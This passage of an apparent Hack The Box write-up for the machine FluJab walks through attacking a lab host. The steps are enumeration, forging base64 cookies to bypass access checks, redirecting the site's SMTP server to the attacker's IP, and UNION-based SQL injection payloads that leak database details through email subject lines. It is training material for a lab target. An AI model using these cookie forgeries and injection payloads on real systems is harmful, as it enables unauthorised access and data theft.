---
title: HTB: FluJab
url: https://0xdf.gitlab.io/2019/06/15/htb-flujab.html
date: 2019-06-15T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-flujab, ctf, hackthebox, nmap, openssl, wfuzz, cookies, python, scripting, sqli, injection, python-cmd, ajenti, ssh, cve-2008-0166, tcp-wrapper, rbash, gtfobins, make, screen, arbitrary-write
---

![FluJab-cover](https://0xdfimages.gitlab.io/img/flujab-cover.png)

FluJab was a long and difficult box, with several complicated steps which require multiple pieces working together and careful enumeration. I’ll start by enumerating a host that hosts websites for many different customers, and is meant to be like a CloudFlare ip. Once identifying the host I’m targeting, I’ll find some weird cookie values that I can manipulate to get access to configuration pages. There I can configure the SMTP to go through my host, and use an SQL injection in one of the forms where I can read the results over email. Information in the database credentials and new subdomain, where I can access an instance of Ajenti server admin panel. That allows me to identify weak ssh keys, and to add my host to an ssh TCP Wrapper whitelist. Then I can ssh in with the weak private key. From there, I’ll find a vulnerable version of screen which I can use to get a root shell. In Beyond Root, I’ll show an unintended path to get a shell through Ajenti using the API, look at the details of the screen exploit, explore the box’s clean up crons, and point out an oddity with nurse jackie.

## Box Info

| Name | [FluJab](https://hackthebox.com/machines/flujab)  [FluJab](https://hackthebox.com/machines/flujab) [Play on HackTheBox](https://hackthebox.com/machines/flujab) |
| --- | --- |
| Release Date | [26 Jan 2019](https://twitter.com/hackthebox_eu/status/1088368586362621953) |
| Retire Date | 15 Jun 2019 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for FluJab |
| Radar Graph | Radar chart for FluJab |
| First Blood User | 18:29:58[yuntao yuntao](https://app.hackthebox.com/users/12438) |
| First Blood Root | 23:30:06[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| Creator | [3mrgnc3 3mrgnc3](https://app.hackthebox.com/users/6983) |

## Recon

### nmap

`nmap` shows four open ports, hosting ssh (22), http (80), and two https (443 and 8080).

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.124
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-30 13:12 EST
Nmap scan report for 10.10.10.124
Host is up (0.018s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.124
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-30 13:13 EST
Warning: 10.10.10.124 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.124
Host is up (0.021s latency).
All 65535 scanned ports on 10.10.10.124 are open|filtered (65457) or closed (78)

root@kali# nmap -sC -sV -p 22,80,443,8080 -oA nmap/scripts 10.10.10.124
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-30 13:50 EST
Nmap scan report for 10.10.10.124
Host is up (0.021s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh?
80/tcp   open  http     nginx
|_http-server-header: ClownWare Proxy
|_http-title: Did not follow redirect to https://10.10.10.124/
443/tcp  open  ssl/http nginx
|_http-server-header: ClownWare Proxy
|_http-title: Direct IP access not allowed | ClownWare
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Not valid before: 2018-11-28T14:57:03
|_Not valid after:  2023-11-27T14:57:03
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
8080/tcp open  ssl/http nginx
|_http-server-header: ClownWare Proxy
|_http-title: Direct IP access not allowed | ClownWare
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Not valid before: 2018-11-28T14:57:03
|_Not valid after:  2023-11-27T14:57:03
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.24 seconds

```

There’s quite a few dns names on the certificate for 443 and 8080.

### SSH - TCP 22

I typically skip SSH in the enumeration phase, as there’s not typically much to enumerate. But it’s worth pointing out that the `nmap` scan didn’t return anything as far as version, which is unusual. If I do try to connect, instead of prompting for a password, it just disconnects:

```

root@kali# ssh 10.10.10.124
ssh_exchange_identification: read: Connection reset by peer

```

I’ll keep this in mind should I find the means to connect over SSH later.

### HTTP - TCP 80

This is just a redirect to https:

```

root@kali# curl -I 10.10.10.124
HTTP/1.1 301 Moved Permanently
Date: Wed, 30 Jan 2019 18:45:04 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: https://10.10.10.124/
Server: ClownWare Proxy

```

It is interesting to note the server, ClownWare Proxy.

### HTTPS - TCP 443

#### Strategy

Typically for HTB, it makes sense to enumerate all the services completely before going too far down any exploit path, to fully understand each one. The typical HTB host doesn’t include too much noise, but rather each bit plays somehow into a path to root. This box is a bit different. I’ll see very quickly that the host is using ClownWare as a Cloudflare knock off - which is to say that lots of hosts are hosted on the same IP. The author posted in the [HTB Forums](https://forum.hackthebox.eu/discussion/1445/flujab/p1) the following message a couple weeks before the box was released:

![1560316645638](https://0xdfimages.gitlab.io/img/1560316645638.png)

So I should try to stay within scope, limiting to the FluJab related sites.

#### Site - By IP

Visiting https://10.10.10.124/ gives the following message:

![1549147021667](https://0xdfimages.gitlab.io/img/1549147021667.png)

This is exactly what a Cloudflare page looks like if you visit it by IP. For example, [http://104.18.173.13/](http://104.18.173.13):

![1560317106579](https://0xdfimages.gitlab.io/img/1560317106579.png)

#### SSL Information

I’ll use `openssl` [to get the certificate information](https://serverfault.com/questions/661978/displaying-a-remote-ssl-certificate-details-using-cli-tools#). I’ll have `echo` send an empty string in (otherwise it hangs), and then have `openssl` connect to target and request the certs. I’ll pipe the output into a second `openssl` to parse the data into a more readable format:

```

root@kali# echo | openssl s_client -showcerts -servername 10.10.10.124 -connect 10.10.10.124:443 2>/dev/null | openssl x509 -inform pem -noout -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = ClownWare Certificate Authority, ST = LON, C = UK, emailAddress = bozo@clownware.htb, O = ClownWare Ltd., OU = ClownWare Protection Services
        Validity
            Not Before: Nov 28 14:57:03 2018 GMT
            Not After : Nov 27 14:57:03 2023 GMT
        Subject: CN = ClownWare.htb, ST = LON, C = UK, emailAddress = bozo@clownware.htb, O = ClownWare Ltd, OU = ClownWare Protection Services
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (4096 bit)
                Modulus:
                    00:c3:52:ab:a2:b7:3b:0b:92:e8:45:84:63:37:1e:
                    2c:0e:d4:2a:92:8b:e6:74:5f:76:59:db:34:62:1b:
                    ea:56:b7:2b:ef:93:78:c2:8e:96:7b:98:8a:c2:f9:
                    c2:64:0d:88:f9:d2:81:db:47:05:f9:94:b4:53:a3:
                    4a:df:f1:a6:9a:cc:2e:a8:58:b9:87:05:02:ce:3d:
                    61:a4:fc:46:ef:79:6b:59:6e:8b:b2:12:5c:6a:6e:
                    96:72:19:10:38:f5:74:75:54:c2:30:2b:0e:87:94:
                    58:86:c9:34:52:c6:86:52:ad:5c:d2:f0:9b:c0:23:
                    a0:06:ba:d3:e8:ca:0e:ab:8b:44:16:f5:71:a7:51:
                    d7:18:d8:b4:68:8c:28:c6:34:a4:0b:63:b4:34:6d:
                    7d:b8:70:a0:4e:ad:09:5f:7b:87:3c:a7:52:6d:4c:
                    74:6a:e8:5e:d1:3c:98:c1:ed:ad:33:fb:24:6b:f5:
                    ad:c6:fe:30:c5:4b:76:94:87:5c:70:dd:d4:4c:84:
                    29:8d:23:33:ff:ee:fc:78:51:f8:88:ca:3c:f0:2b:
                    a5:f6:ff:b1:7a:69:49:40:cc:89:bb:e6:3c:43:b2:
                    39:b4:5f:58:87:be:1d:58:d9:38:fa:c4:0a:0a:1e:
                    d7:73:50:28:60:6a:09:c8:63:3b:48:e7:d3:3f:ac:
                    45:92:64:65:7f:83:11:5b:cb:df:f1:65:cd:07:d8:
                    20:39:84:a7:9d:61:12:3a:5c:75:26:57:8b:bb:02:
                    f0:61:50:67:55:b3:2c:e4:e6:b9:12:6c:f5:c5:91:
                    24:59:63:ca:2b:10:31:2a:55:3d:15:3c:4e:82:ee:
                    d3:e6:77:29:57:13:d6:04:02:ae:b1:ff:98:4a:38:
                    53:18:da:19:66:ac:17:1e:bd:8e:90:0b:d7:22:a7:
                    04:b5:69:0a:92:db:0a:56:ca:15:87:0c:ba:9e:ef:
                    19:2a:cd:0a:66:bb:8c:dc:f2:a5:f1:5e:c3:b8:18:
                    00:e4:33:ce:b9:e5:c2:00:9e:70:e6:9e:22:9d:2d:
                    37:16:66:ae:0d:64:73:11:b6:8e:28:84:d1:32:06:
                    4f:41:e9:51:7d:93:14:f1:31:53:ab:ee:c2:6b:b6:
                    0f:fc:31:2f:e2:d5:09:fe:c8:44:2b:c3:6f:e0:df:
                    df:f5:c8:b6:ef:1e:a1:81:58:ea:ca:78:ec:af:0b:
                    fc:9e:ef:95:63:ac:6b:7d:f6:81:d6:74:81:dd:e3:
                    f3:7c:ab:ed:fc:a5:15:ab:e9:98:99:7b:99:05:0f:
                    bc:4d:d8:a0:6a:a3:32:71:31:02:08:2c:be:4d:7e:
                    9c:db:53:3e:fb:05:db:4c:75:b0:0e:66:b4:8c:6a:
                    2b:30:b3
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment
            X509v3 Subject Alternative Name: 
                DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
    Signature Algorithm: sha256WithRSAEncryption
         90:9b:f0:9a:be:21:1e:0b:d6:fc:d5:1d:57:b1:e0:c2:a2:77:
         8f:b0:a6:c8:5b:83:a2:2a:f5:63:cd:8e:26:53:b5:42:35:f2:
         f5:8d:57:4a:e4:91:f9:8a:92:e3:37:f2:8a:cf:08:d7:92:cb:
         d1:8d:39:7b:ca:5d:cf:b7:f8:d6:3c:34:5a:17:f3:d8:d0:f6:
         ac:07:0f:e4:d5:a6:ec:44:21:ff:cb:27:4d:8c:d0:56:85:fa:
         06:75:26:79:e5:4a:9b:1f:99:e9:6b:f1:d7:c9:17:cd:59:08:
         d1:bb:31:d3:41:f6:c6:27:22:34:eb:56:d2:1e:3b:ad:23:e0:
         ea:a0:72:56:7a:73:07:c6:03:0d:6d:50:cc:97:92:d9:01:68:
         b4:fa:f3:6b:cd:d6:f7:0e:b6:b3:97:28:db:50:10:e0:e1:df:
         61:27:58:b2:5f:39:94:8f:ec:18:f8:a1:f4:1f:e4:4c:8c:c3:
         fb:13:f9:1d:1b:e2:9a:62:3e:5b:c7:6e:1a:c2:7f:87:3c:4d:
         84:ac:03:60:50:30:3d:42:de:66:9f:3c:07:f1:35:05:62:54:
         7d:cd:9a:af:34:00:08:80:c9:ac:38:fd:86:94:51:b0:ef:77:
         66:6c:4e:08:0a:07:59:fb:06:b7:5c:46:ce:45:39:0e:d4:bd:
         c3:b8:f7:4b:5b:64:41:4e:32:0c:ff:82:68:8b:93:be:53:3f:
         cd:5a:fe:23:d2:04:61:8d:b2:7c:23:03:9c:8c:c0:07:61:36:
         9d:05:fd:b6:3d:c3:d4:33:b8:42:12:98:04:b1:ca:c7:67:4e:
         cb:a8:7a:aa:aa:b6:32:8b:8a:57:8b:92:da:ab:a5:e5:1a:4e:
         25:41:06:81:e3:d4:f7:84:9e:a3:bd:e3:09:29:4f:0a:76:17:
         b7:53:b5:a0:05:4b:5b:35:8e:68:0f:2a:93:ac:ed:27:7f:9f:
         4c:a6:bb:f7:71:15:c7:ff:63:d2:74:9d:72:95:3c:b9:0f:a6:
         86:c3:e5:95:e0:10:71:4a:3a:14:9c:f6:dd:2b:e0:b0:e5:7a:
         e4:95:01:8b:25:2f:08:75:24:51:de:7b:95:da:4e:71:f0:6d:
         1b:20:a5:ad:2a:65:b7:b3:17:43:96:04:2f:81:93:82:28:c4:
         fa:3d:83:99:d8:01:39:e7:2c:6b:11:53:f9:77:00:86:b5:aa:
         32:17:40:ea:e2:0a:81:73:08:45:42:07:4c:be:a8:72:1b:7d:
         bd:85:a1:bd:dc:6c:33:bb:11:01:df:0f:cc:a7:42:45:4b:e5:
         51:55:bb:d8:33:c1:c4:e7:e0:52:1a:61:7a:5e:98:9b:d1:9e:
         54:83:70:d1:09:7f:1d:20

```

I’m particularly interested in the DNS information. I’ll run that again, this time pipe into a `grep` for “DNS”, and then do a little rearranging (replace “,” with newline, cut each line to get the domain after “:”), and end up with a list of domains:

```

root@kali# echo | openssl s_client -showcerts -servername 10.10.10.124 -connect 10.10.10.124:443 2>/dev/null | openssl x509 -inform pem -noout -text | grep DNS | tr "," "\n" | cut -d: -f2
clownware.htb
sni147831.clownware.htb
*.clownware.htb
proxy.clownware.htb
console.flujab.htb
sys.flujab.htb
smtp.flujab.htb
vaccine4flu.htb
bestmedsupply.htb
custoomercare.megabank.htb
flowerzrus.htb
chocolateriver.htb
meetspinz.htb
rubberlove.htb
freeflujab.htb
flujab.htb

```

The box author was nice enough to fill most of the sites with silly gifs or images, rather than putting up full potentially buggy CMS pages as rabbit holes:

![](https://0xdfimages.gitlab.io/img/flujab_sites.png)

Between that and thinking about the scope of the box, it’s possible to pretty quickly narrow in on two domains: smtp.flujab.htb and freeflujab.htb. Both of these have some content, and are within scope.

#### smtp.flujab.htb

This page turns out to not be useful to exploitation, but I did take a more in depth look because it has a login page and is in scope:

![1560318539558](https://0xdfimages.gitlab.io/img/1560318539558.png)

I spent a little bit of time playing with the javascript that runs when I hit the sign in button, looks for basic sql injections, tried basic password combinations. Nothing jumped out, so I moved on for now.

#### freeflujab.htb

This site has information about Flu Jabs (which I understand is what they call the flu shot in the UK):

![1560319410693](https://0xdfimages.gitlab.io/img/1560319410693.png)

Under Patients, there’s four interesting links:

![1560319493689](https://0xdfimages.gitlab.io/img/1560319493689.png)

Register leads to `https://freeflujab.htb/?reg`, where there’s a page that includes a form:

![1560319551183](https://0xdfimages.gitlab.io/img/1560319551183.png)

Booking goes to `https://freeflujab.htb/?book` which also includes a form:

![1560319597536](https://0xdfimages.gitlab.io/img/1560319597536.png)

Cancel (`https://freeflujab.htb/?cancel`) and Reminder (`https://freeflujab.htb/?remind`) both redirect to `https://freeflujab.htb/?ERROR=NOT_REGISTERED` which is the main page.

I tried to register with some dummy information, but get an error:

![1560319903418](https://0xdfimages.gitlab.io/img/1560319903418.png)

If I try to book, I get an error as well:

![1560320003226](https://0xdfimages.gitlab.io/img/1560320003226.png)

### HTTPS - TCP 8080

I also attempted to enumerate port 8080, but all I could get was the ClownWare rejection page. I quickly check, I used `wfuzz` with a list of domains from the certificate. For example, when I run it against 443, I get:

```

root@kali# wfuzz -w domains -c -u https://FUZZ
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: https://FUZZ/
Total requests: 15

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000002:  C=200     80 L      250 W         3468 Ch        "sni147831.clownware.htb"
000001:  C=200     80 L      250 W         3468 Ch        "clownware.htb"
000004:  C=200     22 L       39 W          519 Ch        "console.flujab.htb"
000003:  C=200     80 L      250 W         3468 Ch        "proxy.clownware.htb"
000006:  C=200    134 L      433 W         4954 Ch        "smtp.flujab.htb"
000007:  C=200     22 L       35 W          502 Ch        "vaccine4flu.htb"
000005:  C=200     80 L      250 W         3468 Ch        "sys.flujab.htb"
000009:  C=200     22 L       38 W          521 Ch        "custoomercare.megabank.htb"
000010:  C=200     65 L      321 W         3480 Ch        "flowerzrus.htb"
000008:  C=200    402 L     1385 W        21051 Ch        "bestmedsupply.htb"
000012:  C=200     22 L       40 W          522 Ch        "meetspinz.htb"
000013:  C=200     21 L       39 W          492 Ch        "rubberlove.htb"
000014:  C=200    139 L      622 W         8766 Ch        "freeflujab.htb"
000015:  C=200     80 L      250 W         3468 Ch        "flujab.htb"
000011:  C=200     21 L       39 W          491 Ch        "chocolateriver.htb"

Total time: 1.304256
Processed Requests: 15
Filtered Requests: 0
Requests/sec.: 11.50080

```

The responses of length 3468 Ch are the ClownWare page. The rest have some content. However, when I run it on port 8080, everything comes back ClownWare:

```

root@kali# wfuzz -w domains -c -u https://FUZZ:8080
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: https://FUZZ:8080/
Total requests: 15

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200     80 L      250 W         3468 Ch        "clownware.htb"
000002:  C=200     80 L      250 W         3468 Ch        "sni147831.clownware.htb"
000003:  C=200     80 L      250 W         3468 Ch        "proxy.clownware.htb"
000004:  C=200     80 L      250 W         3468 Ch        "console.flujab.htb"
000005:  C=200     80 L      250 W         3468 Ch        "sys.flujab.htb"
000006:  C=200     80 L      250 W         3468 Ch        "smtp.flujab.htb"
000008:  C=200     80 L      250 W         3468 Ch        "bestmedsupply.htb"
000007:  C=200     80 L      250 W         3468 Ch        "vaccine4flu.htb"
000009:  C=200     80 L      250 W         3468 Ch        "custoomercare.megabank.htb"
000010:  C=200     80 L      250 W         3468 Ch        "flowerzrus.htb"
000012:  C=200     80 L      250 W         3468 Ch        "meetspinz.htb"
000011:  C=200     80 L      250 W         3468 Ch        "chocolateriver.htb"
000013:  C=200     80 L      250 W         3468 Ch        "rubberlove.htb"
000014:  C=200     80 L      250 W         3468 Ch        "freeflujab.htb"
000015:  C=200     80 L      250 W         3468 Ch        "flujab.htb"

Total time: 1.331769
Processed Requests: 15
Filtered Requests: 0
Requests/sec.: 11.26321

```

I’ll keep this port in mind for later if I can find another domain to try.

## Getting Credentials

### Strategy

At this point, I could think of a few things to try to move forward on this page.
1. Try to find SQLI in the registration or book forms.
2. Brute force the booking form to try to find registered users.
3. Try to fix the page issues.

After basic SQLI checks returned nothing interesting, and after ruling out brute force because (a) it should always be a last resort on HTB, but more importantly (b) the form requires first name and last name, which is just too big a space to brute over, I turned to seeing what was going on with registration, booking, cancellation, and reminder. With no bypass, here’s where I’m stuck:

| Page | Status |
| --- | --- |
| /?reg | Could not connect to a mailserver at :25 |
| /?book | Not a registered Patient |
| /?cancel | Redirect home with `ERROR=NOT_REGISTERED` |
| /?remind | Redirect home with `ERROR=NOT_REGISTERED` |

### Cookies

On visiting `freeflujab.htb`, the server sets three cookies:

```

Set-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=Wed, 12-Jun-2019 20:31:57 GMT; Max-Age=3600; path=/?smtp_config
Set-Cookie: Patient=b761463b7e444f4d7d04a23a6fc0f037; expires=Wed, 12-Jun-2019 20:31:57 GMT; Max-Age=3600; path=/
Set-Cookie: Registered=Yjc2MTQ2M2I3ZTQ0NGY0ZDdkMDRhMjNhNmZjMGYwMzc9TnVsbA%3D%3D; expires=Wed, 12-Jun-2019 20:31:57 GMT; Max-Age=3600; path=/

```

The `Patient` cookie looks like an MD5 hash. I’m going to take a wild guess that it’s the hash of my IP address, and it is:

```

root@kali# echo -n 10.10.14.8 | md5sum
b761463b7e444f4d7d04a23a6fc0f037  -

```

The `Modus` and `Registered` cookies look like base64 encoded data, and they both decode:

```

root@kali# echo Q29uZmlndXJlPU51bGw= | base64 -d
Configure=Null

root@kali# echo Yjc2MTQ2M2I3ZTQ0NGY0ZDdkMDRhMjNhNmZjMGYwMzc9TnVsbA== | base64 -d
b761463b7e444f4d7d04a23a6fc0f037=Null

```

Both are some value set to `Null`. I’ll notice that the second one is my Patient cookie, which is likely my user id according to the site.

Both of these have potential for me to mess with them and get access to something by changing the value.

### SMTP Config

#### Accessing /?smtp\_config

For the `Modus` cookie, the beyond the value, the path was interesting:

```

Set-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=Wed, 12-Jun-2019 06:49:51 GMT; Max-Age=3600; path=/?smtp_config

```

On visiting, I’m immediately redirected to `https://freeflujab.htb/?denied`.

I’ll reload `/?smtp_config`, this time intercepting in burp, and changing that cookie to `Q29uZmlndXJlPVRydWU%3D`, which I got from:

```

root@kali# echo -n Configure=True | base64
Q29uZmlndXJlPVRydWU=

```

This time the page loads:

![1560320894187](https://0xdfimages.gitlab.io/img/1560320894187.png)

I set up a filter in Burp under Proxy -> Options -> Match and Replace to just always set this to True on outgoing requests:

![1560599485939](https://0xdfimages.gitlab.io/img/1560599485939.png)

#### Setting the SMTP server

I’ll try to submit my IP in the form, but an error pops showing client-side filtering:

![1560321048290](https://0xdfimages.gitlab.io/img/1560321048290.png)

Looking at the page source, I can see what’s required:

```

<input type="text" name="mailserver" id="email-server" value="smtp.flujab.htb" pattern="smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}" title=" A Valid SMTP Domain Address Is Required"/>

```

If I submit `smtp.flujab.htb`, it works, and I can see the updated server in “Current Setting”:

![1560321433614](https://0xdfimages.gitlab.io/img/1560321433614.png)

Now I’ll try to register again, but it fails, again:

![1560321551850](https://0xdfimages.gitlab.io/img/1560321551850.png)

I’ll set the server again, and this time, point it to my host where I can allow it to connect and see what it’s sending.

Since the page doesn’t let me submit an IP, I’ll catch the request in Burp, and change `mailserver=smtp.flujab.htb&port=25&save=Save+Mail+Server+Config` to my IP, and it works:

![1560322917004](https://0xdfimages.gitlab.io/img/1560322917004.png)

Now I’ll open `nc` listening on port 25, and try to register again. I can see what kind of connection comes in. Unfortunately, on submitting the form, I don’t get any contact on `nc`, and instead get a pop-up on the site:

![1560370404598](https://0xdfimages.gitlab.io/img/1560370404598.png)

So that doesn’t seem to help. I checked the cookies, and all the response did was set my `Modus` cookie back so that I can’t reach `/?smtp_config`. It did not change my registration status.

### Registered

#### Cookie

Since registering through the site didn’t seem to help, I’ll try modifying that cookie. I refreshed the root page, and used Burp to capture the server responses. This time, I changed `Registered` to `Registered=Yjc2MTQ2M2I3ZTQ0NGY0ZDdkMDRhMjNhNmZjMGYwMzc9VHJ1ZQ%3D%3D`, which comes from:

```

root@kali# echo -n b761463b7e444f4d7d04a23a6fc0f037=True | base64
Yjc2MTQ2M2I3ZTQ0NGY0ZDdkMDRhMjNhNmZjMGYwMzc9VHJ1ZQ==

```

#### Booking

With the new cookie, I’ll visit the booking page and try to book. I get the same message referencing the first and last name not being a registered patient. It seems this page is relying on something other than the cookie (perhaps the name?) to see if I’m registered.

#### Reminder

The reminder page is different. Before changing the cookie, trying to visit led to a redirect to root. But now, the page loads:

![1560371601326](https://0xdfimages.gitlab.io/img/1560371601326.png)

I can enter something and get a hint as to the format required for an NHS number:

![1560371576231](https://0xdfimages.gitlab.io/img/1560371576231.png)

On entering one, I get an error message about needing an email:

![1560371551781](https://0xdfimages.gitlab.io/img/1560371551781.png)

This seems like a dead end.

#### Cancel

The cancellation page also now loads:

![1560370876990](https://0xdfimages.gitlab.io/img/1560370876990.png)

If I try to enter a random string and hit enter, it tells me the expected format:

![1560371055401](https://0xdfimages.gitlab.io/img/1560371055401.png)

When I enter `NHS-000-000-0000` and submit, if I haven’t yet set the SMTP to my ip, the site returns a familiar error:

![1560371746594](https://0xdfimages.gitlab.io/img/1560371746594.png)

If I have, I get this:

![1560371236202](https://0xdfimages.gitlab.io/img/1560371236202.png)

If I submit again with `nc` listening on 25, I can see the connection:

```

root@kali# nc -lnvp 25
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::25
Ncat: Listening on 0.0.0.0:25
Ncat: Connection from 10.10.10.124.
Ncat: Connection from 10.10.10.124:43036.

```

### Receiving Email

Now that I have the host trying to connect to me for SMTP, I’d better upgrade my side from `nc`. I’ll use the [python smtpd module](https://pymotw.com/3/smtpd/) to write a small loop that just receives email and prints it:

```

#!/usr/bin/env python 

import smtpd
import asyncore

server = smtpd.DebuggingServer(('0.0.0.0', 25), None)

asyncore.loop()

```

On running this, and submitting the cancellation form again, I get the following output:

```

root@kali# ./smtp.py 
---------- MESSAGE FOLLOWS ----------
Date: Wed, 12 Jun 2019 21:34:58 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters <DutyNurse@flujab.htb>
Subject: Flu Jab Appointment - Ref:
Message-ID: <05de45aff688c618655497db5cd705e2@freeflujab.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________
    
    VACCINATION
    Routine Priority
    ------------------
    REF    : NHS-000-000-0000    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED 
    LOC    : Crick026 
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.
------------ END MESSAGE ------------

```

### Identifying SQL Injeciton

There’s something weird going on in the subject line of the email above:

```

Subject: Flu Jab Appointment - Ref:

```

It feels like there should be something after “Ref:”. I also know that the NHS number I submitted likely doesn’t exist (all 0s). I’m going to search for a SQL Injection in the number I submit.

I’ll kick a good request over to repeater and start to play with it. In the video below you’ll see the following:
1. I submit the normal NHS number, and see the email response with the subject line ending “Ref:”.
2. I’ll submit the same again, just to see a new email come through.
3. I’ll add a `'` to the end, and I don’t get another response. This is a good sign that the application sending the email crashed due to the SQL injection.
4. I’ll use UNION to look for the number of rows that are coming back from this query. I’ll start with 1, and build up until I get an email back with 5 columns.

Here’s a video where I’ll explain it:

When I send `nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,3,4,5;+--+-&submit=Cancel+Appointment`, a new email arrives, with subject line `Subject: Flu Jab Appointment - Ref:3`.

On the server, the query probably looks something like (pseudo code, no particular language):

```

sub_ref = sql("select [column3] from [table] where id='{user input NHS ID}';")

```

So on a benign submission:

```

sub_ref = sql("select [column3] from [table] where id='NHS-000-000-0000';")

```

Or with injection:

```

sub_ref = sql("select [column3] from [table] where id='NHS-000-000-0000' UNION SELECT 1,2,3,4,5; -- -';")

```

### Manual DB Enumeration

Now that I know the third column will be sent back to me, I can start to enumerate the database. I’ll start with `nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,@@version,4,5;+--+-&submit=Cancel+Appointment`, and get back:

```

Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1

```

Next I’ll do `nhsnum=NHS-000-000-0000'+UNION+SELECT+1,2,database(),4,5;+--+-&submit=Cancel+Appointment` to get the current database:

```

Subject: Flu Jab Appointment - Ref:vaccinations

```

Now I’ll list the databases. When I send `NHS-000-000-0000'+UNION+select+1,2,TABLE_SCHEMA,4,5+FROM+INFORMATION_SCHEMA.COLUMNS;+--+-`, I get back:

```

Subject: Flu Jab Appointment - Ref:MedStaff

```

So there’s a db called MedStaff, but I already know there’s also a database called vaccinations (the active db). The program must be taking only the first row of results. To get more, I can use `LIMIT i,j` to return only j row starting at offset i. So `NHS-000-000-0000'+UNION+SELECT+1,2,TABLE_SCHEMA,4,5+FROM+INFORMATION_SCHEMA.COLUMNS+LIMIT+0,1;+--+-` returns the same `MedStaff` result, but changing the limit to `LIMIT+1,1` gives me:

```

Subject: Flu Jab Appointment - Ref:information_schema

```

I can start listing tables in a given db with `NHS-000-000-0000'+UNION+SELECT+1,2,CONCAT(TABLE_SCHEMA,':',TABLE_NAME),4,5+FROM+INFORMATION_SCHEMA.COLUMNS+where+TABLE_SCHEMA='MedStaff'+LIMIT+0,1;+--+--`. That will select `TABLE_SCHEMA` and and `TABLE_NAME` and join them with a `:`, resulting in the following as I step the limit from 0 to 8:

```

Subject: Flu Jab Appointment - Ref:MedStaff:current_dept_emp
Subject: Flu Jab Appointment - Ref:MedStaff:departments
Subject: Flu Jab Appointment - Ref:MedStaff:dept_emp
Subject: Flu Jab Appointment - Ref:MedStaff:dept_emp_latest_date
Subject: Flu Jab Appointment - Ref:MedStaff:dept_manager
Subject: Flu Jab Appointment - Ref:MedStaff:employees
Subject: Flu Jab Appointment - Ref:MedStaff:salaries
Subject: Flu Jab Appointment - Ref:MedStaff:titles
Subject: Flu Jab Appointment - Ref:

```

### Scripting It

#### Overview

